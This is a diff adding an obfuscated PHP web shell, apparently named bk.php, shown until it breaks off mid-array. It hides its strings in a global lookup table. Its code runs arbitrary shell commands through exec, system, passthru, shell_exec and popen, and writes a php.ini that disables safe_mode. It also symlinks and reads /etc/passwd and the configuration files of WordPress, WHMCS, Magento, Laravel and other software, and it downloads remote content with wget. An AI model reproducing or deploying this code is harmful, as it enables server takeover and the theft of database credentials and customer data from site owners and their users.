@@ -1,0 +1,848 @@
+<?php
+
+    error_reporting(0);
+    define('æ', '“Èó');
+    $GLOBALS[æ] = array(0 => "./", 1 => "//", 2 => "/", 3 => ".", 4 => "", 5 => "../", 6 => "y", 7 => "a", 8 => "s", 9 => "b", 10 => "d", 11 => "u", 12 => "f", 13 => "q", 14 => "k", 15 => "p", 16 => "l", 17 => "z", 18 => "h", 19 => "i", 20 => "j", 21 => "v", 22 => "x", 23 => "cat ", 24 => "fopen", 25 => "stream_get_contents", 26 => "file_get_contents", 27 => "r", 28 => "file", 29 => "implode", 30 => "?", 31 => ":/home/", 32 => ":/usr/local/cpanel/bin/noshell\n", 33 => "Array", 34 => "0", 35 => "/Array/", 36 => "", 37 => "http://", 38 => "#/home/(.*)/public_html/#", 39 => "SERVER_NAME", 40 => "PHP_SELF", 41 => "\n", 42 => "www.", 43 => "finder", 44 => "Options Indexes FollowSymLinks\nDirectoryIndex foxnoindex.htm\nAddType text/plain .php \nAddHandler text/plain .php\nSatisfy Any\nIndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*\nIndexIgnore *.txt404\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} ^.*", 45 => " [NC]\nRewriteRule \\.txt\$ %{REQUEST_URI}404 [L,R=302.NC]", 46 => "DirectoryIndex ssssfffss.htm", 47 => "/etc/passwd", 48 => "/passwd.txt", 49 => "/Jump/.htaccess", 50 => "/Jump", 51 => "action", 52 => "404", 53 => "/.htaccess", 54 => "Options All", 55 => ":", 56 => ":", 57 => "use bash.", 58 => "upload", 59 => "safe_mode = Off\ndisable_functions = NONE\nsafe_mode_gid = OFF\nopen_basedir = OFF\nexec = ON\nshell_exec = ON", 60 => "php.ini", 61 => "HTTP_HOST", 62 => "/symlink/", 63 => "error_log", 64 => "stream_context_create", 65 => "wget --header=\"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36\" ", 66 => " -O ", 67 => "/tmp/", 68 => "123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", 69 => ".txt", 70 => "r", 71 => "http", 72 => "method", 73 => "GET", 74 => "header", 75 => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36\r\n", 76 => "https://", 77 => "method", 78 => "GET", 79 => "header", 80 => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", 81 => "curl_exec", 82 => "powerauto.cc/apis-explorer", 83 => "http", 84 => "Sec-Fetch-User: ", 85 => "posix_getpwuid", 86 => "/posix_getpwuid/", 87 => "disable_functions", 88 => ".php", 89 => "\\/public_html", 90 => "\\/html", 91 => "\\/www\\/htdocs", 92 => "\\/miracle", 93 => "\\/htdocs", 94 => "\\/data\\/www", 95 => "\\/www_root", 96 => "\\/httpdocs", 97 => "\\/httpsdocs", 98 => "\\/http", 99 => "\\/docs", 100 => "\\/web", 101 => "\\/www", 102 => "\\/", 103 => "w", 104 => "file_put_contents", 105 => "win", 106 => "config", 107 => "<html>Working</html>", 108 => "HTTP_HOST", 109 => "127.0.0.1", 110 => "localhost", 111 => "/action=/", 112 => "REQUEST_URI", 113 => "display_errors", 114 => "fname", 115 => "sname", 116 => "tmp_name", 117 => "<successfully>Uploaded successfully.</successfully>", 118 => "PD9waHA=", 119 => "name", 120 => "\\", 121 => "/", 122 => "200", 123 => "-", 124 => ".txt404/fox.txt", 125 => ".txt404/.htaccess", 126 => ".txt404", 127 => "DirectoryIndex foxnoindex.html\nHeaderName fox.txt\nSatisfy Any\nIndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble\nIndexIgnore *", 128 => "/shop/app/etc/local.xml", 129 => "Magento-shop", 130 => "/magento/app/etc/local.xml", 131 => "Magento-magento", 132 => "/shop/app/config/parameters.php", 133 => "PrestaShop7-shop", 134 => "/prestashop/app/config/parameters.php", 135 => "PrestaShop7-prestashop", 136 => "/shop/config/settings.inc.php", 137 => "PrestaShop-shop", 138 => "/prestashop/config/settings.inc.php", 139 => "PrestaShop-prestashop", 140 => "/shop/config.php", 141 => "OpenCart-shop", 142 => "/oc/config.php", 143 => "/opencart/config.php", 144 => "OpenCart-opencart", 145 => "/.accesshash", 146 => "accesshash-WHMCS", 147 => "/.my.conf", 148 => "myconf-cPanel", 149 => "/my/configuration.php", 150 => "WHMCS-my", 151 => "/accounts/configuration.php", 152 => "WHMCS-accounts", 153 => "/account/configuration.php", 154 => "WHMCS-account", 155 => "/host/configuration.php", 156 => "WHMCS-host", 157 => "/user/configuration.php", 158 => "WHMCS-user", 159 => "/panel/configuration.php", 160 => "WHMCS-panel", 161 => "/support/configuration.php", 162 => "WHMCS-support", 163 => "/billing/configuration.php", 164 => "WHMCS-billing", 165 => "/client/configuration.php", 166 => "WHMCS-client", 167 => "/clients/configuration.php", 168 => "WHMCS-clients", 169 => "/clientarea/configuration.php", 170 => "WHMCS-clientarea", 171 => "/manager/configuration.php", 172 => "WHMCS-manager", 173 => "/whmcs/configuration.php", 174 => "WHMCS-whmcs", 175 => "/portal/configuration.php", 176 => "WHMCS-portal", 177 => "/members/configuration.php", 178 => "WHMCS-members", 179 => "/order/configuration.php", 180 => "WHMCS-order", 181 => "/core/configuration.php", 182 => "WHMCS-core", 183 => "/hosting/configuration.php", 184 => "WHMCS-hosting", 185 => "/manage/configuration.php", 186 => "WHMCS-manage", 187 => "/domains/configuration.php", 188 => "WHMCS-domains", 189 => "/cp/configuration.php", 190 => "WHMCS-cp", 191 => "/central/configuration.php", 192 => "WHMCS-central", 193 => "/control/configuration.php", 194 => "WHMCS-control", 195 => "/clientearea/configuration.php", 196 => "WHMCS-clientearea", 197 => "/painel/configuration.php", 198 => "WHMCS-painel", 199 => "/customers/configuration.php", 200 => "WHMCS-customers", 201 => "/main/configuration.php", 202 => "WHMCS-main", 203 => "/cliente/configuration.php", 204 => "WHMCS-cliente", 205 => "/whm/configuration.php", 206 => "WHMCS-whm", 207 => "/supports/configuration.php", 208 => "WHMCS-supports", 209 => "/billings/configuration.php", 210 => "WHMCS-billings", 211 => "/clientes/configuration.php", 212 => "WHMCS-clientes", 213 => "/joomla/configuration.php", 214 => "Joomla-joomla", 215 => "/web/configuration.php", 216 => "Joomla-web", 217 => "/blog/wp-config.php", 218 => "WordPress-blog", 219 => "/wordpress/wp-config.php", 220 => "WordPress-wordpress", 221 => "/wp/wp-config.php", 222 => "WordPress-wp", 223 => "/portal/sites/default/settings.php", 224 => "Drupal-portal", 225 => "/drupal/sites/default/settings.php", 226 => "Drupal-drupal", 227 => "root", 228 => "bin", 229 => "adm", 230 => "spool", 231 => "var", 232 => "sbin", 233 => "nologin", 234 => "nobody", 235 => "lib", 236 => "cpanel", 237 => "usr", 238 => "libexec", 239 => "dovecot", 240 => "mqueue", 241 => "userhomes", 242 => "cpanelphppgadmin", 243 => "cpanelsolr", 244 => "clamav", 245 => "munin", 246 => "3rdparty", 247 => "named", 248 => "chrony", 249 => "postfix", 250 => "empty", 251 => "sshd", 252 => "null", 253 => "dev", 254 => "ftp", 255 => "_", 256 => "/app/etc/local.xml", 257 => "Magento", 258 => "/app/config/parameters.php", 259 => "PrestaShop7", 260 => "/config/settings.inc.php", 261 => "PrestaShop", 262 => "/config.php", 263 => "OpenCart", 264 => "/configuration.php", 265 => "Joomla", 266 => "/wp-config.php", 267 => "WordPress", 268 => "/customer/configuration.php", 269 => "WHMCS-customer", 270 => "Joomla-portal", 271 => "/Jump/0-", 272 => "/sites/default/settings.php", 273 => "Drupal", 274 => "/store/app/etc/local.xml", 275 => "Magento-store", 276 => "/market/app/etc/local.xml", 277 => "Magento-market", 278 => "/store/app/config/parameters.php", 279 => "PrestaShop7-store", 280 => "/market/app/config/parameters.php", 281 => "PrestaShop7-market", 282 => "/store/config/settings.inc.php", 283 => "PrestaShop-store", 284 => "/market/config/settings.inc.php", 285 => "PrestaShop-market", 286 => "/store/config.php", 287 => "OpenCart-store", 288 => "/market/config.php", 289 => "OpenCart-market", 290 => "/site/configuration.php", 291 => "Joomla-site", 292 => "/home/configuration.php", 293 => "Joomla-home", 294 => "/portal/wp-config.php", 295 => "WordPress-portal", 296 => "/site/wp-config.php", 297 => "WordPress-site", 298 => "/home/wp-config.php", 299 => "WordPress-home", 300 => "/web/wp-config.php", 301 => "WordPress-web", 302 => "/site/sites/default/settings.php", 303 => "Drupal-site", 304 => "/home/sites/default/settings.php", 305 => "Drupal-home", 306 => "/web/sites/default/settings.php", 307 => "Drupal-web", 308 => "/.env", 309 => "env", 310 => "/admin/.env", 311 => "admin-env", 312 => "/laravel/.env", 313 => "laravel-env", 314 => "/test/.env", 315 => "test-env", 316 => "/demo/.env", 317 => "demo-env", 318 => "/old/.env", 319 => "old-env", 320 => "/new/.env", 321 => "new-env", 322 => "/new/wp-config.php", 323 => "WordPress-new", 324 => "/old/wp-config.php", 325 => "WordPress-old", 326 => "/blogs/wp-config.php", 327 => "WordPress-blogs", 328 => "/beta/wp-config.php", 329 => "WordPress-beta", 330 => "/demo/wp-config.php", 331 => "WordPress-demo", 332 => "/test/wp-config.php", 333 => "WordPress-test", 334 => "/new/configuration.php", 335 => "Joomla-new", 336 => "/old/configuration.php", 337 => "Joomla-old", 338 => "/blogs/configuration.php", 339 => "Joomla-blogs", 340 => "/wp/configuration.php", 341 => "Joomla-wp", 342 => "/beta/configuration.php", 343 => "Joomla-beta", 344 => "/demo/configuration.php", 345 => "Joomla-demo", 346 => "/test/configuration.php", 347 => "Joomla-test", 348 => "/new/config.php", 349 => "OpenCart-new", 350 => "/old/config.php", 351 => "OpenCart-old", 352 => "OpenCart-oc", 353 => "/demo/config.php", 354 => "OpenCart-demo", 355 => "/test/config.php", 356 => "OpenCart-test", 357 => "SERVER_ADDR", 358 => "/vhosts/", 359 => "win", 360 => "RTLCSS is a framework for transforming Cascading Style Sheets (CSS) from Left-To-Right (BTR) to (PVX) Right-To-Left (RTL). pass usual", 361 => "referer: ", 362 => "\r\n", 363 => "zttv:", 364 => "cii", 365 => "rtp", 366 => ".min.css", 367 => "popen", 368 => "exec", 369 => "passthru", 370 => "system", 371 => "shell_exec", 372 => "HTTP_USER_AGENT", 373 => "COOKIE.txt", 374 => "http://", 375 => "log_errors", 376 => "posix_getegid", 377 => "?", 378 => "gid", 379 => "uid", 380 => "pwd", 381 => "/public_html", 382 => "H*", 383 => "nix", 384 => "PD8=", 385 => "Pz4=", 386 => "#10\\.(.*)\\.(.*)\\.(.*)#", 387 => "/192\\.168\\./", 388 => "HTTPS", 389 => "on", 390 => "action1", 391 => "/httpdocs", 392 => "/cdn-cgi/phish-bypass?u=/&atok=", 393 => "/Warning:/", 394 => "#name=\"atok\" value=\"(.*)\">#", 395 => "COOKIE.txt", 396 => "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
+    error_reporting(0);
+    @ini_set($GLOBALS[æ][0x3f], NULL);
+    @ini_set($GLOBALS[æ][0x177], 0);
+    @ini_set($GLOBALS[æ][0x71], 0);
+    echo "<html>Working</html>";
+    function xI9b_($PpfcE, $FoFfK)
+    {
+        $J3O2_ = strlen($FoFfK);
+        $CI0Oa = substr($PpfcE, strlen($PpfcE) - $J3O2_);
+        return $CI0Oa == $FoFfK;
+    }
+    function XaPZM($iM42f)
+    {
+        if (stristr($iM42f, $GLOBALS[æ][0x2])) {
+            if (!(strpos($iM42f, $GLOBALS[æ][0x1]) !== !1)) {
+                goto ekudM;
+            }
+            $iM42f = str_replace($GLOBALS[æ][0x1], $GLOBALS[æ][0x2], $iM42f);
+            ekudM:
+            if (!(xI9B_($iM42f, $GLOBALS[æ][0x2]) == !0)) {
+                goto y7IHb;
+            }
+            $iM42f = substr_replace($iM42f, $GLOBALS[æ][0x4], -1);
+            y7IHb:
+            $xdnd2 = $GLOBALS[æ][0x4];
+            $fc2LY = explode($GLOBALS[æ][0x2], $iM42f);
+            $nAl8O = 0x1;
+            oBUtY:
+            if (!($nAl8O < count($fc2LY) - 0x1)) {
+                if (!($iM42f[0] == $GLOBALS[æ][0x3] && $iM42f[0x1] == $GLOBALS[æ][0x2])) {
+                    goto ZwNaA;
+                }
+                $xdnd2 = $GLOBALS[æ][0] . $xdnd2;
+                ZwNaA:
+                if (!($iM42f[0] == $GLOBALS[æ][0x3] && $iM42f[0x1] == $GLOBALS[æ][0x3])) {
+                    goto V6rLT;
+                }
+                $xdnd2 = $GLOBALS[æ][0x5] . $xdnd2;
+                V6rLT:
+                if (!(strpos($xdnd2, $GLOBALS[æ][0x1]) !== !1)) {
+                    goto Y6Lzz;
+                }
+                $xdnd2 = str_replace($GLOBALS[æ][0x1], $GLOBALS[æ][0x2], $xdnd2);
+                Y6Lzz:
+                return trim($xdnd2);
+            }
+            $xdnd2 .= $GLOBALS[æ][0x2] . $fc2LY[$nAl8O];
+            $nAl8O++;
+            goto oBUtY;
+        }
+        return realpath($GLOBALS[æ][0]);
+    }
+    function M8etX($V3ZjS, $VithF)
+    {
+        $U2yqX = strtolower("PHP");
+        $OUWeH = xAPzm($V3ZjS);
+        if (!(!is_writable($OUWeH) && $U2yqX != $GLOBALS[æ][0x69])) {
+            goto lh1RK;
+        }
+        chmod($OUWeH, 0755);
+        lh1RK:
+        if (!(file_exists($V3ZjS) && is_file($V3ZjS) && !is_writable($V3ZjS) && $U2yqX != $GLOBALS[æ][0x69])) {
+            goto Bqt7N;
+        }
+        chmod($V3ZjS, 0644);
+        Bqt7N:
+        if (function_exists($GLOBALS[æ][0x68])) {
+            $q0SdV = file_put_contents($V3ZjS, $VithF);
+            goto B2SRc;
+        }
+        $q0SdV = fwrite(fopen($V3ZjS, $GLOBALS[æ][0x67]), $VithF);
+        B2SRc:
+        return $q0SdV;
+    }
+    function h9eCZ($vk1zv)
+    {
+        $NJtyZ = $GLOBALS[æ][0x4];
+        if (function_exists($GLOBALS[æ][0x170])) {
+            @exec($vk1zv, $NJtyZ);
+            $NJtyZ = @join($GLOBALS[æ][0x29], $NJtyZ);
+            goto M3caV;
+        }
+        if (function_exists($GLOBALS[æ][0x171])) {
+            ob_start();
+            @passthru($vk1zv);
+            $NJtyZ = ob_get_clean();
+            goto M3caV;
+        }
+        if (function_exists($GLOBALS[æ][0x172])) {
+            ob_start();
+            @system($vk1zv);
+            $NJtyZ = ob_get_clean();
+            goto M3caV;
+        }
+        if (function_exists($GLOBALS[æ][0x173])) {
+            $NJtyZ = shell_exec($vk1zv);
+            goto M3caV;
+        }
+        if (function_exists($GLOBALS[æ][0x16f]) && is_resource($U3iuj = @popen($vk1zv, $GLOBALS[æ][0x1b]))) {
+            $NJtyZ = $GLOBALS[æ][0x24];
+            yodqh:
+            if (@feof($U3iuj)) {
+                pclose($U3iuj);
+                goto ptICD;
+            }
+            $NJtyZ .= fread($U3iuj, 0x400);
+            goto yodqh;
+        }
+        ptICD:
+        M3caV:
+        return $NJtyZ;
+    }
+    function ktkVn($vBvxD)
+    {
+        $jXVYK = $GLOBALS[æ][0x4];
+        global $D1xRo;
+        global $XpuiD;
+        if (!(trim($jXVYK) == $GLOBALS[æ][0x4] && function_exists($GLOBALS[æ][0x1a]) && function_exists($GLOBALS[æ][0x40]))) {
+            goto VSOeM;
+        }
+        $jXVYK = file_get_contents($vBvxD, !1, stream_context_create(array($GLOBALS[æ][0x47] => array($GLOBALS[æ][0x4d] => $GLOBALS[æ][0x4e], $GLOBALS[æ][0x4f] => $GLOBALS[æ][0x4b]))));
+        file_get_contents($D1xRo . $GLOBALS[æ][0x52], !1, stream_context_create(array($GLOBALS[æ][0x53] => array($GLOBALS[æ][0x4d] => $GLOBALS[æ][0x4e], $GLOBALS[æ][0x4f] => $GLOBALS[æ][0x54] . $XpuiD))));
+        VSOeM:
+        if (!(trim($jXVYK) == $GLOBALS[æ][0x4] && function_exists($GLOBALS[æ][0x51]))) {
+            goto zO_Ms;
+        }
+        $Uh2M4 = curl_init();
+        curl_setopt($Uh2M4, CURLOPT_TIMEOUT, 0xa);
+        curl_setopt($Uh2M4, CURLOPT_RETURNTRANSFER, !0);
+        curl_setopt($Uh2M4, CURLOPT_URL, $vBvxD);
+        curl_setopt($Uh2M4, CURLOPT_USERAGENT, $GLOBALS[æ][0x50]);
+        curl_setopt($Uh2M4, CURLOPT_FOLLOWLOCATION, !0);
+        if (!stristr($vBvxD, $GLOBALS[æ][0x4c])) {
+            goto AfgtZ;
+        }
+        curl_setopt($Uh2M4, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($Uh2M4, CURLOPT_SSL_VERIFYHOST, 0);
+        AfgtZ:
+        curl_setopt($Uh2M4, CURLOPT_HEADER, !1);
+        $jXVYK = curl_exec($Uh2M4);
+        curl_close($Uh2M4);
+        zO_Ms:
+        if (!(trim($jXVYK) == $GLOBALS[æ][0x4])) {
+            goto Ts4wH;
+        }
+        $wg2t0 = $GLOBALS[æ][0x43] . substr(str_shuffle($GLOBALS[æ][0x44]), 0x32) . $GLOBALS[æ][0x45];
+        H9Ecz($GLOBALS[æ][0x41] . $vBvxD . $GLOBALS[æ][0x42] . $wg2t0);
+        if (function_exists($GLOBALS[æ][0x1a])) {
+            $jXVYK = file_get_contents($wg2t0);
+            goto BYn4b;
+        }
+        $jXVYK = stream_get_contents(fopen($wg2t0, $GLOBALS[æ][0x1b]));
+        BYn4b:
+        unlink($wg2t0);
+        Ts4wH:
+        if (!(trim($jXVYK) == $GLOBALS[æ][0x4] && function_exists($GLOBALS[æ][0x18]) && function_exists($GLOBALS[æ][0x19]) && function_exists($GLOBALS[æ][0x40]))) {
+            goto Gn1cG;
+        }
+        $cRmI3 = fopen($vBvxD, $GLOBALS[æ][0x46], !1, stream_context_create(array($GLOBALS[æ][0x47] => array($GLOBALS[æ][0x48] => $GLOBALS[æ][0x49], $GLOBALS[æ][0x4a] => $GLOBALS[æ][0x4b]))));
+        if (!$cRmI3) {
+            goto LFsGj;
+        }
+        $jXVYK = stream_get_contents($cRmI3);
+        LFsGj:
+        Gn1cG:
+        return $jXVYK;
+    }
+    function jtzvI($d3EAR, $X0k2A = null, $RzL1T = null)
+    {
+        $OfSve = curl_init();
+        curl_setopt($OfSve, CURLOPT_URL, $d3EAR);
+        curl_setopt($OfSve, CURLOPT_HEADER, !0);
+        curl_setopt($OfSve, CURLOPT_RETURNTRANSFER, 0x1);
+        curl_setopt($OfSve, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
+        curl_setopt($OfSve, CURLOPT_CONNECTTIMEOUT, 0x1e);
+        curl_setopt($OfSve, CURLOPT_TIMEOUT, 0x1e);
+        curl_setopt($OfSve, CURLOPT_FOLLOWLOCATION, 0x1);
+        curl_setopt($OfSve, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($OfSve, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($OfSve, CURLOPT_USERAGENT, $_SERVER[$GLOBALS[æ][0x174]]);
+        curl_setopt($OfSve, CURLOPT_COOKIEFILE, $GLOBALS[æ][0x175]);
+        curl_setopt($OfSve, CURLOPT_COOKIEJAR, $GLOBALS[æ][0x175]);
+        if (!($X0k2A != null)) {
+            goto nw81H;
+        }
+        curl_setopt($OfSve, CURLOPT_HTTPHEADER, $X0k2A);
+        nw81H:
+        if (!($RzL1T != null)) {
+            goto Q63vN;
+        }
+        curl_setopt($OfSve, CURLOPT_POST, 0x1);
+        curl_setopt($OfSve, CURLOPT_POSTFIELDS, $RzL1T);
+        Q63vN:
+        $OwgmQ = curl_exec($OfSve);
+        curl_close($OfSve);
+        return $OwgmQ;
+    }
+    if (!(trim($_POST[$GLOBALS[æ][0x33]]) != $GLOBALS[æ][0x3a])) {
+        goto akhzW;
+    }
+    $Y7axu = @ini_get($GLOBALS[æ][0x57]);
+    if (!empty($Y7axu) && preg_match($GLOBALS[æ][0x3e], strval($Y7axu)) && !H9ecz($GLOBALS[æ][0x17c])) {
+        die($GLOBALS[æ][0x39]);
+    }
+    if (!empty($Y7axu) && preg_match($GLOBALS[æ][0x3e], strval($Y7axu)) && trim($_POST[$GLOBALS[æ][0x33]]) == $GLOBALS[æ][0x34]) {
+        die($GLOBALS[æ][0x39]);
+    }
+    FN2NV:
+    akhzW:
+    function CZzKw($iM42f, $xdnd2)
+    {
+        $oKOTp = copy($iM42f, $xdnd2);
+        if ($oKOTp) {
+            goto f8f8L;
+        }
+        $oKOTp = symlink($iM42f, $xdnd2);
+        f8f8L:
+        if (!$oKOTp) {
+            if (!(is_link($xdnd2) || is_file($xdnd2) || is_dir($xdnd2))) {
+                if ($oKOTp) {
+                    goto YcYwJ;
+                }
+                $oKOTp = H9eCz("ln -s {$iM42f} {$xdnd2};echo 'Done'");
+                YcYwJ:
+                return $oKOTp;
+            }
+            return $oKOTp;
+        }
+        return $oKOTp;
+    }
+    function T47bb($iM42f, $xdnd2)
+    {
+        $oKOTp = copy($iM42f, $xdnd2);
+        if (!(is_link($xdnd2) || is_file($xdnd2) || is_dir($xdnd2))) {
+            if ($oKOTp) {
+                goto DwHVz;
+            }
+            $oKOTp = H9ecZ("ln -s {$iM42f} {$xdnd2};echo 'Done'");
+            DwHVz:
+            return $oKOTp;
+        }
+        return $oKOTp;
+    }
+    function vajFt($iM42f, $xdnd2)
+    {
+        $oKOTp = symlink($iM42f, $xdnd2);
+        if (!$oKOTp) {
+            if (!(is_link($xdnd2) || is_file($xdnd2) || is_dir($xdnd2))) {
+                if ($oKOTp) {
+                    goto eg4UZ;
+                }
+                $oKOTp = H9ecZ("ln -s {$iM42f} {$xdnd2};echo 'Done'");
+                eg4UZ:
+                return $oKOTp;
+            }
+            return $oKOTp;
+        }
+        return $oKOTp;
+    }
+    function wccmh($V3ZjS)
+    {
+        $app2N = $GLOBALS[æ][0x4];
+        if (function_exists($GLOBALS[æ][0x1a])) {
+            $app2N = file_get_contents($V3ZjS);
+            goto vFBNy;
+        }
+        if (function_exists($GLOBALS[æ][0x18]) && function_exists($GLOBALS[æ][0x19])) {
+            $app2N = stream_get_contents(fopen($V3ZjS, $GLOBALS[æ][0x1b]));
+            goto vFBNy;
+        }
+        if (function_exists($GLOBALS[æ][0x1d]) && function_exists($GLOBALS[æ][0x1c])) {
+            $app2N = implode(file($V3ZjS));
+            goto vFBNy;
+        }
+        if (function_exists($GLOBALS[æ][0x1c])) {
+            $Whrz2 = file($V3ZjS);
+            if (function_exists($GLOBALS[æ][0x1d])) {
+                $app2N = implode($Whrz2);
+                goto Cq6qO;
+            }
+            foreach ($Whrz2 as $HACNN) {
+                $app2N .= $HACNN;
+            }
+            Cq6qO:
+            goto BEIM_;
+        }
+        BEIM_:
+        vFBNy:
+        if (!(trim($app2N) == $GLOBALS[æ][0x4])) {
+            goto mtTB5;
+        }
+        $app2N = H9ecZ($GLOBALS[æ][0x17] . $V3ZjS);
+        mtTB5:
+        return $app2N;
+    }
+    function nQ7sq($xpROp, $HabLm)
+    {
+        $gFwSn = 0;
+        $NsKAf = WcCmh($xpROp);
+        $Whrz2 = explode($GLOBALS[æ][0x29], $NsKAf);
+        foreach ($Whrz2 as $HACNN) {
+            if (!strstr($HACNN, $HabLm)) {
+                goto aeUbV;
+            }
+            $gFwSn++;
+            aeUbV:
+        }
+        return $gFwSn;
+    }
+    $fFiyD = strval(basename("/var/www/html/bk.php"));
+    $U3iuj = explode($GLOBALS[æ][0x3], $fFiyD);
+    $fFiyD = $U3iuj[0] . $GLOBALS[æ][0x58];
+    $NsKAf = wCCmH($fFiyD);
+    if (!(trim($_SERVER[$GLOBALS[æ][0x6c]]) == $GLOBALS[æ][0x4] || $_SERVER[$GLOBALS[æ][0x6c]] == $GLOBALS[æ][0x6d] || $_SERVER[$GLOBALS[æ][0x6c]] == $GLOBALS[æ][0x6e] || !preg_match($GLOBALS[æ][0x6f], strval($_SERVER[$GLOBALS[æ][0x70]])))) {
+        goto cLNhc;
+    }
+    m8eTX($fFiyD, HJGKq(str_rot13(HjgKq($NsKAf))));
+    cLNhc:
+    function HHmFA($xpROp, $HabLm)
+    {
+        $EJSPD = Nq7sq($xpROp, $HabLm);
+        $NsKAf = wccMH($xpROp);
+        $Whrz2 = explode($GLOBALS[æ][0x29], $NsKAf);
+        $tX6Cf = $GLOBALS[æ][0x4];
+        foreach ($Whrz2 as $HACNN) {
+            if (!(strstr($HACNN, $HabLm) || $EJSPD <= 0)) {
+                goto gJv3E;
+            }
+            $EJSPD--;
+            if (!($EJSPD <= 0)) {
+                goto HamZV;
+            }
+            $tX6Cf .= $HACNN . $GLOBALS[æ][0x29];
+            HamZV:
+            gJv3E:
+        }
+        return $tX6Cf;
+    }
+    function z6CTv($XXcac, $orMHY, $wU3_B, $iyHNI, $ljAoV, $PtoNw)
+    {
+        if (!empty($_POST[$GLOBALS[æ][0x33]])) {
+            $xIV4o = trim($_POST[$GLOBALS[æ][0x33]]);
+            goto U6i65;
+        }
+        $xIV4o = $GLOBALS[æ][0x7a];
+        U6i65:
+        $nIGcd = substr($orMHY, 0x1);
+        if (!(strpos($nIGcd, $GLOBALS[æ][0x2]) !== !1)) {
+            goto uahuJ;
+        }
+        $nIGcd = str_replace($GLOBALS[æ][0x2], $GLOBALS[æ][0xff], $nIGcd);
+        uahuJ:
+        $H9t7p = array($GLOBALS[æ][0x80] => $GLOBALS[æ][0x81], $GLOBALS[æ][0x82] => $GLOBALS[æ][0x83], $GLOBALS[æ][0x84] => $GLOBALS[æ][0x85], $GLOBALS[æ][0x86] => $GLOBALS[æ][0x87], $GLOBALS[æ][0x88] => $GLOBALS[æ][0x89], $GLOBALS[æ][0x8a] => $GLOBALS[æ][0x8b], $GLOBALS[æ][0x8c] => $GLOBALS[æ][0x8d], $GLOBALS[æ][0x8e] => $GLOBALS[æ][0x8d], $GLOBALS[æ][0x8f] => $GLOBALS[æ][0x90], $GLOBALS[æ][0x91] => $GLOBALS[æ][0x92], $GLOBALS[æ][0x93] => $GLOBALS[æ][0x94], $GLOBALS[æ][0x95] => $GLOBALS[æ][0x96], $GLOBALS[æ][0x97] => $GLOBALS[æ][0x98], $GLOBALS[æ][0x99] => $GLOBALS[æ][0x9a], $GLOBALS[æ][0x9b] => $GLOBALS[æ][0x9c], $GLOBALS[æ][0x9d] => $GLOBALS[æ][0x9e], $GLOBALS[æ][0x9f] => $GLOBALS[æ][0xa0], $GLOBALS[æ][0xa1] => $GLOBALS[æ][0xa2], $GLOBALS[æ][0xa3] => $GLOBALS[æ][0xa4], $GLOBALS[æ][0xa5] => $GLOBALS[æ][0xa6], $GLOBALS[æ][0xa7] => $GLOBALS[æ][0xa8], $GLOBALS[æ][0xa9] => $GLOBALS[æ][0xaa], $GLOBALS[æ][0xab] => $GLOBALS[æ][0xac], $GLOBALS[æ][0xad] => $GLOBALS[æ][0xae], $GLOBALS[æ][0xaf] => $GLOBALS[æ][0xb0], $GLOBALS[æ][0xb1] => $GLOBALS[æ][0xb2], $GLOBALS[æ][0xb3] => $GLOBALS[æ][0xb4], $GLOBALS[æ][0xb5] => $GLOBALS[æ][0xb6], $GLOBALS[æ][0xb7] => $GLOBALS[æ][0xb8], $GLOBALS[æ][0xb9] => $GLOBALS[æ][0xba], $GLOBALS[æ][0xbb] => $GLOBALS[æ][0xbc], $GLOBALS[æ][0xbd] => $GLOBALS[æ][0xbe], $GLOBALS[æ][0xbf] => $GLOBALS[æ][0xc0], $GLOBALS[æ][0xc1] => $GLOBALS[æ][0xc2], $GLOBALS[æ][0xc3] => $GLOBALS[æ][0xc4], $GLOBALS[æ][0xc5] => $GLOBALS[æ][0xc6], $GLOBALS[æ][0xc7] => $GLOBALS[æ][0xc8], $GLOBALS[æ][0xc9] => $GLOBALS[æ][0xca], $GLOBALS[æ][0xcb] => $GLOBALS[æ][0xcc], $GLOBALS[æ][0xcd] => $GLOBALS[æ][0xce], $GLOBALS[æ][0xcf] => $GLOBALS[æ][0xd0], $GLOBALS[æ][0xd1] => $GLOBALS[æ][0xd2], $GLOBALS[æ][0xd3] => $GLOBALS[æ][0xd4], $GLOBALS[æ][0xd5] => $GLOBALS[æ][0xd6], $GLOBALS[æ][0xd7] => $GLOBALS[æ][0xd8], $GLOBALS[æ][0xd9] => $GLOBALS[æ][0xda], $GLOBALS[æ][0xdb] => $GLOBALS[æ][0xdc], $GLOBALS[æ][0xdd] => $GLOBALS[æ][0xde], $GLOBALS[æ][0xdf] => $GLOBALS[æ][0xe0], $GLOBALS[æ][0xe1] => $GLOBALS[æ][0xe2]);
